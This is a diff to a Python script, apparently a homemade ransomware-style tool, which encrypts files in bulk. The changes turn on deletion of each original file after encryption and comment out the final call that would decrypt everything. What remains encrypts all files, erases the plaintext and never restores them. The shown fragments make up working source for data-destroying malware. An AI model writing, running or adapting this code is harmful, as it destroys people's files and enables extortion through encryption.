@@ -45,7 +45,7 @@ def encryptFile(filepath,key,iv):
 
         with open(encrypted_path, "w") as f:
             f.write(encodedCipher)
-        #path.unlink()
+        path.unlink()
     except Exception as e:
         print(f"Encryption failed for {filepath}: {e}")
 
@@ -73,12 +73,12 @@ def decryptFIle(filepath,key):
         except e:
             print(f"Decryption failed (wrong key or corrupted file): {path.name}:{e}")
             return
-        
-        original_path = original_path.rename(str(original_path.with_suffix(""))+"_dec")
+        original_path = original_path.with_suffix("")
+        #original_path = original_path.rename(str(original_path.with_suffix(""))+"_dec")
         original_path = original_path.with_suffix(".txt")
         with open(original_path, "w") as f:
             f.write(decrypted_text)
-        #path.unlink()  # remove encrypted version
+        path.unlink()  # remove encrypted version
         print(f"Decrypted: {path.name} → {original_path}")
     except Exception as e:
         print(f"Decryption failed for {filepath}: {e}")
@@ -113,4 +113,4 @@ iv = generateIv()
 
 encrypt_all_files(key,iv)
 time.sleep(5)
-decrypt_all_files(key)
+#decrypt_all_files(key)
